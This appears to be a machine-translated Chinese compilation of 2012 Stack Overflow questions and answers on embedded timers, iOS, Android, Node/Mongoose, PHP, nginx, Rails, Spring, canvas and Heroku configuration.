> 标签：timer, embedded, msp430

朋友们，我必须在 61 微秒的时隙中每 14 微秒采样一次输入，并使用定时器输入（项目要求）。

我必须做 8 次才能生成一个字节。更像 UART ，但我将它用于我的硕士项目的单线总线通信。

我编写了如下代码，它给出了预期的结果，并在调试器中一次执行一条指令对其进行了测试。

下面是代码。

```
/*****************************************************************************

COMPARE MODE SAMPLING:

MCLK and SCLK @8MZ

The code configures P2.1  as TA1.CCI1A input.
It samples the input at P2.1 Whenever the TA1R reaches the TA1CCR1 value.

It samples input on P2.1 every 14us once in a duration of 61 us.

It then reads 8 bits one by one to read a byte.

******************************************************************************/

#include "io430g2553.h"

#define MSP_DQ BIT5

unsigned char word=0x00;

unsigned char i=0;
unsigned char temp;

void Read(void)
{

TA1CCR0 = 0x1E8; //  61 micro secs

TA1CCR1 = 0x70; // 14 micro secs

//TA0CCTL1 = CM_2 | CCIS_0 | SCS | CAP | OUTMOD_0 | CCIE;
//Keep in mind that It should not be configured as campture mode

TA1CCTL1 |= CM_2 | CCIS_0 | SCS | OUTMOD_0 | CCIE;

TA1CTL = TASSEL_2 + MC_1 + ID_0; // Register TA0CTL -> SMCLK/1, Up mode

do{

while ((TA1CCTL0 & CCIFG) == 0 ) // wait while CCIF is set
{
}

**TA1CCTL0 &= ~CCIFG; // Clear the flag** (%1%)
//TA1CTL &= ~TAIFG; // Clear the flag
i++;
} while( i<8) ;

TA1CTL = TACLR; // Stop the Timer
TA1CCTL1 = 0x00;

}

void Configure_CCI1A(void)
{

// Configuring P2.1 as TA1.CCI1A

P2OUT &= 0x00; // Clearing P1OUT
P2DIR &= ~BIT1 ; // Configuring P1.2 as input
P2SEL |= BIT1 ; // P2.1 Timer1_A, capture: CCI1A input, compare: Out1 output
P2SEL2 &= ~BIT1 ;

}

void main(void)
{
WDTCTL = WDTPW + WDTHOLD; // Stop WDT

BCSCTL1 = CALBC1_8MHZ;
DCOCTL = CALDCO_8MHZ;

P1OUT &= 0x00; // Clearing P1OUT
P1DIR |= BIT0 ; // Configuring P1.0 as Output

__enable_interrupt();

Configure_CCI1A();
Read();

**P1OUT ^= BIT0;** //(%2%)

while(1) {

}
}

// Timer A1 interrupt service routine
#pragma vector=TIMER1_A1_VECTOR
__interrupt void Timer1_A1 (void)
{

P1OUT ^= BIT0; // To show Read occured

word <<=1; // If x = 00000010 (binary) => x <<= 2; => x=00001000
temp=0x00;
temp=((TA1CCTL1 & SCCI)>>10);
**word = word + temp ;** //(%3%)

} 
```

但问题是，当我调用该函数时，它似乎有些卡住了。我猜它并没有完全从 ISR 中出来，尽管当我在调试器中一次运行一条指令时它完成了所有的执行。为了让我的问题清楚，这就是我测试的方式：

假设如果我在 ISR 中的突出显示表达式 (%3%) 处放置切换断点，那么它进入 ISR 时会点击切换断点 8 次，捕获正确的值并巧妙地从读取函数中出来（并且

```
while ((TA1CCTL0 & CCIFG) == 0 ) // wait while CCIF is set
{
} 

and

{

....

....

i++;

} while( i<8) ; 
```

超出上述循环）

, 在电源中达到 while(1) 表达式。

但是，如果我将切换点放在突出显示的表达式 (%1%) 上，它就会出现卡住。或者，如果我将切换断点直接放在我期望的 main 中的 (%2%) 处，它会完成读取功能，将值存储在 word 变量中以达到切换断点，但代码似乎卡住并且没有命中切换中断。

我不知道是什么问题，有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T21:10:54.533

当您读取 TAIV 或您在 TACCTL1 中手动清除它时，中断标志会自动清除。但是，您在 ISR 中均未执行这些操作，因此中断仍处于挂起状态，并且您的 CPU 不断执行您的 ISR 而没有其他代码，因此它永远没有机会退出`Read()`。

我的猜测是，通过在 ISR 中设置断点，您的开发环境会导致读取 TAIV 并清除挂起的中断。我以前经历过，但不确定这种行为有多普遍，因为它是不可取的。

# iphone - UITableViewCell addSubview 重复对象

> ID：11702635
> 
> 赞同：1
> 
> 时间：2012-07-28T16:15:51.807
> 
> 标签：iphone, objective-c, uitableview

很简单的问题。在`cellForRowAtIndexPath`我需要添加一个自定义`UILabel`. 所以我在给定的方法中尝试这个：

```
UILabel *titleLbl = [[UILabel alloc] init];
//Other properties etc

if (indexPath.row == 0) titleLbl.text = @"1";
else if (indexPath.row == 1) titleLbl.text = @"2";

[cell addSubview:titleLbl]; 
```

问题是当向下滚动我的表格时，标签开始重复和复制。

我怎样才能解决这个问题？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:21:28.170

将该标签作为子视图添加到

```
if (!cell) {
  cell =...;
  UILabel *label;
  label.tag = 1;
  [cell addSubview:label];
}

UILabel *label = (UILabel*)[cell viewWithTag:1];
if (indexPath.row == 0) label.text = @"1"; 
```

这样，它只会在分配单元格时添加。要检索该标签，请为其添加标签并使用单元格的 viewWithTag 方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:20:57.923

这是因为您的单元格正在被重复使用，并且每次您都在添加标签。

最好将 UITableViewCell 子类化，在其中添加 UILabel。不要忘记覆盖 prepareForReuse 方法，您可以在该方法中将标签的文本设置为 nil

# xpath - 网络抓取：我如何处理欧元符号？

> ID：11702636
> 
> 赞同：1
> 
> 时间：2012-07-28T16:15:58.070
> 
> 标签：xpath, screen-scraping, euro

所以我试图在网站上抓取产品的价格，它们的 HTML 看起来像这样：

`<div class="pricing_price">€12.99</div>`

现在我编写了一个获取价格的 xpath 查询，它返回如下字符串：

`â‚¬Â 12.99`.

如果可能的话，我只想得到`12.99`. 我有哪些选择？我应该使用正则表达式吗？还是有更好/更简单的解决方案？

# mysql - mysql没有连接但是为什么会这样

> ID：11702638
> 
> 赞同：-4
> 
> 时间：2012-07-28T16:16:11.167
> 
> 标签：mysql, connection

在 localhost/blah/index.php 中，它允许我登录、注册 accs 等。
我将我的网站上传到我的虚拟主机。
我去我的网站，但我没有看到 mysql 连接。

它在我的 localhost/phpmyadmin/xampp 上运行良好，或者 w/eu 调用它
是什么导致这种情况发生？
寻找新的虚拟主机和/或更新我的 php 版本不是一种选择

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:19:13.293

也许您使用本地数据库设置。将它们更新为服务器数据库设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:27:11.643

确保您的服务器上有 MySQL。
检查服务器上 MySQL 的连接设置。
在服务器上根据需要上传或创建数据库/表。

# php - nginx.conf 用于一个宁静的 api

> ID：11702639
> 
> 赞同：8
> 
> 时间：2012-07-28T16:16:18.087
> 
> 标签：php, .htaccess, rest, nginx, dotcloud

我目前正在开发一个 RESTful api 作为我的 ios/web 应用程序与其共享数据库和内容之间的桥梁。

我在[这个博客](http://www.9lessons.info/2012/05/create-restful-services-api-in-php.html)上找到了用 PHP 实现 RESTful api 的方法。

我在基于 OVH Apache 的服务器上开始了我的开发。不幸的是，他们没有为网络托管服务提供 oauth 支持，也没有办法安装它。OVH 告诉我，为此我需要一个专用服务器或 VPS 服务器。

现在，我将在[dotCloud](http://www.dotcloud.com)上工作。我认为这是一个很好的选择，但他们的服务器（似乎是 Amazon EC2 的服务器）是基于 nginx 的。这将是我第一次使用 nginx 服务器，我需要你的帮助来“翻译”[这个 .htaccess](http://pastie.org/4348813)到 nginx.conf 文件。

在寻求您的帮助之前，我试图为此找到一个 nginx.conf 文件，但没有人工作。当我将它们推送到我的 dotcloud 应用程序时，我的应用程序的 http 服务崩溃并且 dotcloud cli 说：

> 14:55:44 [www.0] 警告：服务在启动时崩溃或正在侦听错误的端口。它未能在 30 秒内响应端口“http”(80)。请检查应用程序日志。

提前感谢您的帮助:)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-30T15:14:54.690

感谢[这个](http://www.anilcetin.com/convert-apache-htaccess-to-nginx/)htaccess to nginx.conf 转换器，以及我所做的一些技巧和测试，~~这里是对应的 nginx.conf 文件。~~

我希望它能帮助人们。;)

编辑：指向我的配置的链接已失效，但转换器仍然可用。只要你有一个有效的 Apache 配置，你就可以开始了。

# node.js - mongodb 返回不正确的键类型

> ID：11702646
> 
> 赞同：0
> 
> 时间：2012-07-28T16:17:33.873
> 
> 标签：node.js, mongodb, express, mongoose

我使用 node.js+express+mongodb+mongoose，试图通过自定义 id 从数据库中检索用户，由于 id 值的数据类型不正确，页面返回完全空，这是我的代码的一部分：

```
var User = new Schema({
  name: String , 
  email: String ,
  id: Number,
  role: String
});
var userModel = mongoose.model('User', User);
var person = new userModel();

function loaduser(req, res, next) {
  userModel.find({}, req.params.id, function(err, user){
    if (user){
      req.user = user;
      console.log(user);
      next();
    }
  })
  console.log(typeof req.params.id);
};

//personal page route
app.get('/user/:id', loaduser, function(req, res){
  res.render('show', { users: req.user });
}); 
```

然后在控制台中返回：

```
string
{ _id: 5012aa222c2d4d5876c5acd0,
    email: 'alex@mail.com',
    id: '0',
    name: 'alex',
    role: 'admin' }, 
```

即使我将 id 的类型声明为*Number*，它也会返回为*String*。欢迎任何建议:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T18:04:08.360

`req.params.id`似乎是错误的

`userModel.find({}, req.params.id, function(err, user){`

* * *

它应该是

`userModel.find({}, { id: parseInt(req.params.id) }, function(err, user){`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T18:26:12.363

你的`find`电话不太对劲。第一个参数应该是您的查询文档，因为您正在寻找一个文档，所以您应该使用它`findOne`。您还需要转换`req.params.id`为数字：

```
userModel.findOne({ id: Number(req.params.id) }, function(err, user){ 
```

如果您仍然看到以`id`字符串形式返回的问题，那么它一定是集合中的字符串。

# android - 从 HTTP 请求更新列表视图

> ID：11702648
> 
> 赞同：0
> 
> 时间：2012-07-28T16:17:55.057
> 
> 标签：android

我正在尝试显示从网络服务器上的 mysql 数据库获取的项目列表。这是我为页面创建的。

```
 public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.getlist);
    showBusyDialog();
    new GetData()
    .execute(picdetails);
} 
```

这是我的 GetData 类。这里的问题在于将项目添加到列表视图的行。我将 JSON 数组作为文本结果传递。

```
 public class GetData extends AsyncTask<String, Void, String> {
      @Override
        protected String doInBackground(String... pic) {
            // You might be tempted to display the busy dialog here, but you
            // CAN'T update the UI from this method!
            return loadImageFromNetwork(pic[0]);
        }

        @Override
        protected void onPostExecute(String result) {
            // Our long-running process is done, and we can safely access the UI thread
            int ct_id;
            String item_make;
            String item_model;
            String item_price;
            String item_desc;
            String item_location;
            String item_image;
            dismissBusyDialog();

            TableLayout tl = (TableLayout)findViewById(R.id.myTableLayout1);
            try{
                 JSONArray jArray = new JSONArray(result);
                 JSONObject json_data=null;
                 for(int i=0;i<jArray.length();i++){
                     json_data = jArray.getJSONObject(i);
                        ct_id=json_data.getInt("id");
                        item_make=json_data.getString("make");
                        item_model=json_data.getString("model");
                        item_price = json_data.getString("price");
                        item_desc = json_data.getString("cardesc");
                        item_location = json_data.getString("location");
                        item_image = json_data.getString("image");
                        String image_URL = "http://www.myurl.com/images/" + car_image;

                     TableRow tr = new TableRow(null);
                     tr.setId(ct_id);
                     tr.setClickable(true);

                     tr.setOnClickListener(new  OnClickListener() {

                            @Override
                            public void onClick(final View v) {

                                String sdet_id;
                                int det_id;
                    //          v.setBackgroundColor(Color.GRAY);
                                det_id = v.getId();
                                sdet_id = String.valueOf(det_id);
                                final Intent i = new Intent();
                                i.setClassName("demo.example.com", "demo.example.com.viewdetails");
                                i.putExtra("Det_id", sdet_id);
                                startActivity(i);

                      //        v.setBackgroundColor(Color.TRANSPARENT);
                                // TODO Auto-generated method stub
                            }
                        });
                     TableLayout.LayoutParams tableRowParams=
                          new TableLayout.LayoutParams
                          (TableLayout.LayoutParams.FILL_PARENT,TableLayout.LayoutParams.WRAP_CONTENT);

                        int leftMargin=20;
                        int topMargin=10;
                        int rightMargin=15;
                        int bottomMargin=20;

                        tableRowParams.setMargins(leftMargin, topMargin, rightMargin, bottomMargin);

                        tr.setLayoutParams(tableRowParams);

                          /* Create a Button to be the row-content. */
                     ImageView myimage = new ImageView(R.layout.getlist);

                     BitmapFactory.Options bmOptions;
                    bmOptions = new BitmapFactory.Options();
                    bmOptions.inSampleSize = 1;
                    Bitmap bm = LoadImage(image_URL, bmOptions);
                    myimage.setImageBitmap(bm);
                     tr.addView(myimage);
                     TextView tmake=new TextView(R.layout.getlist);
                    // tmake.setText(item_make);
                     tmake.setText(Html.fromHtml("<H1>" + "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" + item_location + "</H1>" +  "<br />&nbsp;&nbsp;&nbsp;;" + item_desc  
                  ));
                     tr.addView(tmake); 

                     TextView tmodel=new TextView(R.layout.getlist);
                     tmodel.setText(Html.fromHtml("<b><H1>" + "&nbsp;&nbsp;" + "€" + item_price + "</b></H1></br></br>" ));
                     tr.addView(tmodel);

                /* Add row to TableLayout. */
                 //  tr.setPadding(50, 0, 0, 0);
                     tl.addView(tr);
                     View v = new View(R.layout.getlist);
                     v.setLayoutParams(new TableRow.LayoutParams(TableRow.LayoutParams.FILL_PARENT, 1));
                     v.setBackgroundColor(Color.rgb(51, 51, 51));
                     tl.addView(v);
                      }

                 }

                 catch(JSONException e1){
                  Toast.makeText(getBaseContext(), "No Category Found" ,Toast.LENGTH_LONG).show();
                 } catch (ParseException e1) {
                    e1.printStackTrace();
            }

        }
    } 
```

问题似乎在于创建新项目以添加到视图中，像这样的行

```
 View v = new View(R.layout.getlist); 
```

我的整体结构还可以吗，还是我需要换一种方式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:28:48.693

1.通常我们在 asyncTask 中显示繁忙的对话框`onPreExecute`。

2.你需要借助充气机来夸大你的观点。

```
LayoutInflater li = (LayoutInflater)mContext.getSystemService(Context.LAYOUT_INFLATER_SERVICE);     
View v = li.inflate(R.layout.view, null); 
```

希望这会帮助你。

# php - 亚马逊 MWS 提交价格设置提要

> ID：11702649
> 
> 赞同：5
> 
> 时间：2012-07-28T16:18:11.090
> 
> 标签：php, xml, api, amazon, amazon-mws

我一直在看文档，想知道如何提交一个 XML 提要，它可以做一些简单的事情，比如更改库存商品的价格

我一直在查看他们提供的示例 XML 提要，如此[链接](https://images-na.ssl-images-amazon.com/images/G/01/mwsportal/doc/en_US/bde/MWSFeedsApiReference._V146551159_.pdf)中的第 15 页所示，因为这是我发现的唯一示例，我不知道如何在我的卖家库存中插入或编辑产品。谁能给我任何提示

**给出的例子**

```
POST /?Marketplace=ATVExampleDER
  & Action=SubmitFeed
  &Merchant=A1XExample5E6
  &FeedType=_POST_PRODUCT_DATA_
  &AWSAccessKeyId=0PB842ExampleN4ZTR2
  &Version=2009-01-01
  &Signature=SvSExamplefZpSignaturex2cs%3D
  &SignatureVersion=2
  &SignatureMethod=HmacSHA256
  &Timestamp=2009-01-26T23%3A51%3A31.315Z HTTP/1.1
Content-Type: text/xml; charset=iso-8859-1
Content-MD5: ExampleMd5HashOfHttpBodyAsPerRfc2616Example
User-Agent: MWSTestsuite/2009-03-05 (Language=Java/1.6.0_11/50.0/
Sun Microsystems Inc.; Platform=Linux/i386/2.4.21-50a6smp;
MWSClientVersion=2009-03-09)
Host: mws.amazonservices.com
Transfer-Encoding: chunked 
```

**饲料内容**

```
<?xml version="1.0" encoding="iso-8859-1"?>
<AmazonEnvelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:noNamespaceSchemaLocation="amzn-envelope.xsd">
    <Header>
        <DocumentVersion>1.01</DocumentVersion>
        <MerchantIdentifier>M_EXAMPLE_123456</MerchantIdentifier>
    </Header>
  <MessageType>Product</MessageType>
  <PurgeAndReplace>false</PurgeAndReplace>
  <Message>
    <MessageID>1</MessageID>
    <OperationType>Update</OperationType>
    <Product>
        <SKU>56789</SKU>
        <StandardProductID>
          <Type>ASIN</Type>
          <Value>B0EXAMPLEG</Value>
        </StandardProductID>
        <ProductTaxCode>A_GEN_NOTAX</ProductTaxCode>
        <DescriptionData>
          <Title>Example Product Title</Title>
          <Brand>Example Product Brand</Brand>
          <Description>This is an example product description.</Description>
          <BulletPoint>Example Bullet Point 1</BulletPoint>
          <BulletPoint>Example Bullet Point 2</BulletPoint>
          <MSRP currency="USD">25.19</MSRP>
          <Manufacturer>Example Product Manufacturer</Manufacturer>
          <ItemType>example-item-type</ItemType>
        </DescriptionData>
        <ProductData>
          <Health>
           <ProductType>
              <HealthMisc>
                <Ingredients>Example Ingredients</Ingredients>
                <Directions>Example Directions</Directions>
              </HealthMisc>
            </ProductType>
          </Health>
        </ProductData>
    </Product>
  </Message>
</AmazonEnvelope> 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-28T17:23:54.690

查看[XML 指南。](https://images-na.ssl-images-amazon.com/images/G/02/rainier/help/XML_Documentation_Intl._V158772716_.pdf) 它更好地说明了在亚马逊上列出产品所需的步骤。

您基本上将首先提交产品提要，它提供有关产品的所有一般信息并在您的库存中创建部分列表。然后发布一个库存提要，这将设置您的可用数量。最后是价格馈送，它设定价格。对产品执行一次此操作后，您只需上传数量或价格 Feed，具体取决于需要更改的内容。

# javascript - HTML5 Canvas - 如何填充（）特定上下文

> ID：11702650
> 
> 赞同：2
> 
> 时间：2012-07-28T16:18:30.807
> 
> 标签：javascript, html, canvas, fill

我正在尝试制作一个在 Canvas 上绘制图像的网站，然后用户可以按下一个按钮来 ctx.fill() 它的某些部分的颜色。我遇到了问题，我只能 ctx.fill() 最近创建的形状，这通常不是我想要的形状。

这是一个例子。在这段代码中（位于[http://build.rivingtondesignhouse.com/piol/test/](http://build.rivingtondesignhouse.com/piol/test/)）我试图绘制第一个矩形，然后 save() 它在堆栈上，然后绘制第二个矩形（并且不要保存它），然后当我的 fill() 函数被调用时，我想用不同的模式恢复（）第一个矩形和 ctx.fill（）它。它不起作用！

在实践中，我实际上是在尝试用用户在绘制图像后选择的任何颜色填充这个复杂形状的灰色部分，但我认为技术是相同的。(http://build.rivingtondesignhouse.com/piol/test/justTop.html)

提前感谢您的帮助！！！

这是代码：

```
<script type="text/javascript">
var canvas;
var ctx;

function init() {
    canvas = document.getElementById("canvas");
    ctx = canvas.getContext("2d");
    draw();
}

function draw() {   
    ctx.fillStyle = '#FA6900';
    ctx.shadowOffsetX = 5;
    ctx.shadowOffsetY = 5;
    ctx.shadowBlur    = 4;
    ctx.shadowColor   = 'rgba(204, 204, 204, 0.5)';
    ctx.fillRect(0,0,15,150);
    ctx.save();

    ctx.fillStyle = '#E0E4CD';
    ctx.shadowOffsetX = 10;
    ctx.shadowOffsetY = 10;
    ctx.shadowBlur    = 4;
    ctx.shadowColor   = 'rgba(204, 204, 204, 0.5)';
    ctx.fillRect(30,0,30,150);
}

function fill(){
    var image = new Image();
    image.src = "http://www.html5canvastutorials.com/demos/assets/wood-pattern.png";
    image.onload = drawPattern;
    function drawPattern() {
        ctx.restore();
        ctx.fillStyle = ctx.createPattern(image, "repeat");
        ctx.fill();
    }
}

init(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-29T05:24:03.940

在我回答这个问题之前，我们需要澄清一些误解。

`save()`并且`restore()`不要保存和恢复画布位图。相反，他们保存和恢复在画布上下文中设置的所有属性，仅此而已！

例如

```
ctx.fillStyle = 'red';
ctx.save(); // save the fact that the fillstyle is red
ctx.fillStyle = 'blue'; // change the fillstyle
ctx.fillRect(0,0,5,5); // draws a blue rectangle
ctx.restore(); // restores the old context state, so the fillStyle is back to red
ctx.fillRect(10,0,5,5); // draws a red rectangle // draws a red rectangle 
```

[在此处](http://jsfiddle.net/tsLwf/)查看该代码。

因此，您不会通过调用`save()`. 保存位图的唯一方法是将它（或它的一部分）绘制到另一个画布（使用`anotherCanvasContext.drawImage(canvasIWantToSave, 0, 0)`），或者保存足够的信息，以便通过适当的更改重新绘制整个场景。

以下是您可以重新构造代码以使其执行所需的一种方式的示例：http: [//jsfiddle.net/xwqXb/](http://jsfiddle.net/xwqXb/)

# ruby-on-rails - Michael Hartl 的 Ruby on Rails 教程第 8 章测试失败

> ID：11702654
> 
> 赞同：2
> 
> 时间：2012-07-28T16:18:59.280
> 
> 标签：ruby-on-rails, ruby, rspec

我是 Rails 的新手。我正在关注 Michael Hartl 的教程，Ruby on Rails 教程 - 使用 Rails 学习 Web 开发 (http://ruby.railstutorial.org/)。当我尝试通过一些测试时，我发现了一个错误。我执行*bundle exec rspec*时的输出是下一个：

```
.........................................F.....

Failures:

  1) Authentication signin with invalid information 
     Failure/Error: it { should have_selector('div.alert.alert-error', text: 'Invalid') }
       expected css "div.alert.alert-error" with text "Invalid" to return something
     # ./spec/requests/authentication_pages_spec.rb:23:in `block (4 levels) in <top (required)>'

Finished in 1.39 seconds
47 examples, 1 failure

Failed examples:

rspec ./spec/requests/authentication_pages_spec.rb:23 # Authentication signin with invalid information 
```

下一个文件发生了更大的变化，我认为其中一个可能导致错误：

# authentication_pages_rspec.rb

```
require 'spec_helper'

describe "Authentication" do

  subject { page }

  describe "signin page" do
    before { visit signin_path }

    it { should have_selector('h1',    text: 'Sign in') }
    it { should have_selector('title', text: 'Sign in') }
  end

describe "signin" do

    before { visit signin_path }

    describe "with invalid information" do
      before { click_button "Sign in" }

      it { should have_selector('title', text: 'Sign in') }
      it { should have_selector('div.alert.alert-error', text: 'Invalid') }

      describe "after visiting another page" do
        before { click_link "Home" }
        it { should_not have_selector('div.alert.alert-error') }
      end
    end

    describe "with valid information" do
      let(:user) { FactoryGirl.create(:user) }
      before do
        fill_in "Email",    with: user.email
        fill_in "Password", with: user.password
        click_button "Sign in"
      end

      it { should have_selector('title', text: user.name) }
      it { should have_link('Profile', href: user_path(user)) }
      it { should have_link('Sign out', href: signout_path) }
      it { should_not have_link('Sign in', href: signin_path) }
    end
  end
end 
```

# session_controler.rb

```
class SessionsController `>` ApplicationController

  def new
  end

  def create
    user = User.find_by_email(params[:session][:email])
    if user && user.authenticate(params[:session][:password])
      sign_in user
      redirect_to user
    else
      flash.now[:error] = 'Invalid email/password combination'
      render 'new'
    end
  end

  def destroy
  end
end 
```

# session_helper.rb

```
module SessionsHelper

  def sign_in(user)
    cookies.permanent[:remember_token] = user.remember_token
    self.current_user = user;
  end

  def signed_in?
    !current_user.nil?
  end

  def current_user=(user)
    @current_user = user
  end

  def current_user
    @current_user ||= User.find_by_remember_token(cookies[:remember_token])
  end
end 
```

如果您需要任何其他文件，请告诉我，我会发布它。先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:56:28.000

我浏览了你的代码，除了分号

```
 self.current_user = user; 
```

我没有看到任何奇怪的东西。你还没有发布你正在测试的方法，

```
if user && user.authenticate(params[:session][:password]) 
```

不过，问题可能就在那里。

查找问题的一般步骤：

*   如果您正在使用它，请重新启动 spark。
*   手动测试失败的规范：功能是否有效？
*   如果没有，修复它
*   如果功能应该可以工作，但规范仍然失败，请在测试期间使用 launchy 和 save_and_open_page 查看页面。

加法1：

好吧，那部分在你的规范中

```
before { visit signin_path }

describe "with invalid information" do
  before { click_button "Sign in" } 
```

引导您到 SessionController 创建操作（因为链接链接到在 config/routes.rb 中映射的 signin_path）并且可能出错的主要逻辑是`user.authenticate(params[:session][:password])`- 由 has_secure_password 提供。

# multithreading - 使用不支持多线程的语言锁定代码段

> ID：11702655
> 
> 赞同：0
> 
> 时间：2012-07-28T16:19:08.910
> 
> 标签：multithreading, locking

在某些情况下，我们需要确保某段代码不会被一个线程使用，而另一个线程在该段中。使用支持多线程的语言很容易通过“锁定”这些部分来实现。但是当我们必须“模拟”线程时，没有内置的东西，比如`lock`C# 中的关键字或`Lock`Java 中的接口。我发现在这些情况下锁定部分的最佳方法如下所示：

```
if (!locked){
    locked = true;

    do some stuff

    locked = false;
} else {
    add to queue
} 
```

当前解决方案的缺点是什么？值得积极使用吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:25:24.513

也许两个线程可以进入`if`语句。

**解释**

如果`T1`在`if`语句中输入并且不更改`locked`值。突然间，如果 CPU 更改`T1`为`T2`，`locked`值将继续`false`。然后`T2`也会进入`if`语句。

```
T1 -> !locked   -> Stopped -> Waiting -> ... //locked value still false and T2
T2 ->  Waiting  ->  Waked  -> !locked -> ... //will be able to enter into if 
```

你应该看看[**Semaphores**](http://en.wikipedia.org/wiki/Semaphore_%28programming%29)和[**Mutexes**](http://en.wikipedia.org/wiki/Mutual_exclusion)，如果你只使用两个进程，你可以使用[**Peterson's Algorithm**](http://en.wikipedia.org/wiki/Peterson%27s_algorithm)，但它仍然有一个繁忙的等待处理！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:40:11.350

看看底层系统或操作系统提供的[双重检查锁定](http://en.wikipedia.org/wiki/Double-checked_locking)和同步原语：互斥锁、信号量、motinore 等。您会惊讶于即使 C++ 没有`Lock`关键字，但一切都很好。C#`lock`是使用[监视器实现的，您可以](http://en.wikipedia.org/wiki/Monitor_%28synchronization%29)[在此处](https://stackoverflow.com/questions/5111779/lock-monitor-internal-implementation-in-net)找到更多详细信息。

# spring - 在 Spring 中实现单例 bean

> ID：11702662
> 
> 赞同：0
> 
> 时间：2012-07-28T16:19:38.857
> 
> 标签：spring, spring-mvc, singleton

我正在尝试使用 Spring 为我的网站创建一个缓存类，并将以下代码添加到我的 applicationContect.xml 文件中：

```
<bean id="SiteCache" class="Cache.SiteCache"> 
```

我不确定的是如何初始化这个类。我什至需要自己初始化它还是在站点加载时Spring会处理它？如果是这样，我将如何接受构造函数中的参数？

我希望大部分时间都使用该类，作为访问变量以填充站点的更快方法，但我需要一种首先检查是否存在实例的方法，以便我可以加载 XML 文件否则来自来源。

在春季实现缓存的最佳方法是什么？

非常感谢，

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-28T16:44:43.787

> 我不确定的是如何初始化这个类。

默认情况下（提供您的定义）Spring 将只创建一个 bean 实例，并在其他代码需要它的任何地方使用它。

> 我将如何接受构造函数中的参数？

查看[*4.4.1.1 基于构造函数的依赖注入*](http://static.springsource.org/spring/docs/current/spring-framework-reference/html/beans.html#beans-constructor-injection)：

```
<bean id="foo" class="x.y.Foo">
  <constructor-arg ref="bar"/>
  <constructor-arg value="42"/>
</bean> 
```

和[*4.4.2.7 XML 快捷方式与 c-namespace*](http://static.springsource.org/spring/docs/current/spring-framework-reference/html/beans.html#beans-c-namespace)：

```
<bean id="foo" class="x.y.Foo" c:_0-ref="bar" c:_1-ref="baz"> 
```

> 在春季实现缓存的最佳方法是什么？

使用内置的[Spring 缓存抽象](http://static.springsource.org/spring/docs/current/spring-framework-reference/html/cache.html)是一个好的开始。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-30T07:50:52.287

似乎只需要在缓存类的构造函数中加载 XML 文件即可。最后我什至不需要定义一个 bean，只需在每个控制器的 GET/POST 方法中接受它就足以使缓存类保持单例。这样，XML 文件只加载一次，并在站点构建时保存到缓存对象中。之后，缓存对象可用于更轻松的访问。

不过，感谢您提供的替代建议，它们在更复杂的系统上似乎更有效，事实证明我的并不真正需要所有这些。我也有一个粗略的想法，只需要一点提醒！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:29:18.883

> 在春季实现缓存的最佳方法是什么？

在实现缓存方面，我建议使用现有的缓存实现，例如 EhCache 或类似的结合 Spring[缓存抽象](http://static.springsource.org/spring/docs/3.1.0.M1/spring-framework-reference/html/cache.html)。

这使得缓存就像注释一个应该访问缓存的方法一样简单`@Cacheable`。Spring 将在执行该方法之前尝试使用缓存。

虽然编写自己的缓存看起来很简单，但最难的部分始终是缓存失效。

# grails - 为 Heroku Grails 应用程序配置根 URL

> ID：11702665
> 
> 赞同：0
> 
> 时间：2012-07-28T16:19:52.577
> 
> 标签：grails, heroku, jetty

我在 Heroku 上使用 Grails 堆栈来部署应用程序。我希望能够以 root 为我的应用程序提供服务，`myapp.herokuapp.com/xyz`而不是`myapp.herokuapp.com`，就像我能够从`localhost:8080/xyz`开发中的 root 提供服务一样。我试过`grails.app.context`像这样在 Config.groovy 中添加一个：

```
environments {
    production {
            grails.app.context = "/xyz"
    }
} 
```

但它似乎对部署没有影响。我必须用 Heroku 配置一些东西吗？有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-29T07:55:41.070

看起来您必须将`jetty-web.xml`文件添加到`WEB-INF`目录才能设置上下文路径：

```
<?xml version="1.0" encoding="UTF-8"?>
<!-- File: web-app/WEB-INF/jetty-web.xml -->
<!DOCTYPE Configure PUBLIC "-//Mort Bay Consulting//DTD Configure//EN" "http://jetty.mortbay.org/configure.dtd">
<Configure class="org.mortbay.jetty.webapp.WebAppContext">
    <Set name="contextPath">/xyz</Set>
</Configure> 
```

如果这有帮助，请访问[此](http://mrhaki.blogspot.com/2009/12/grails-goodness-change-context-path-of.html)站点，该站点链接自Tomas Lin的[Grails 和 Heroku文章。](http://fbflex.wordpress.com/2011/08/30/grails-on-heroku/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T17:29:23.987

我认为您不能使用当前的[Grails build pack](https://github.com/heroku/heroku-buildpack-grails)设置上下文路径。如果您愿意，可以分叉构建包并对其进行破解以支持设置上下文（有关构建包的更多信息，请参见[构建包文档](https://devcenter.heroku.com/articles/buildpacks)）。

另一种选择是将您的 Grails 应用程序在本地构建到 WAR 文件中，然后使用[WAR 部署](https://devcenter.heroku.com/articles/war-deployment)来部署 WAR 文件。WAR 部署过程将使用[webapp-runner](https://github.com/jsimone/webapp-runner)实用程序使用 Tomcat 运行您的应用程序，它支持配置上下文路径。这是 webapp-runner 7.0.22.3 的帮助输出（我碰巧安装的，可能有点过时了）：

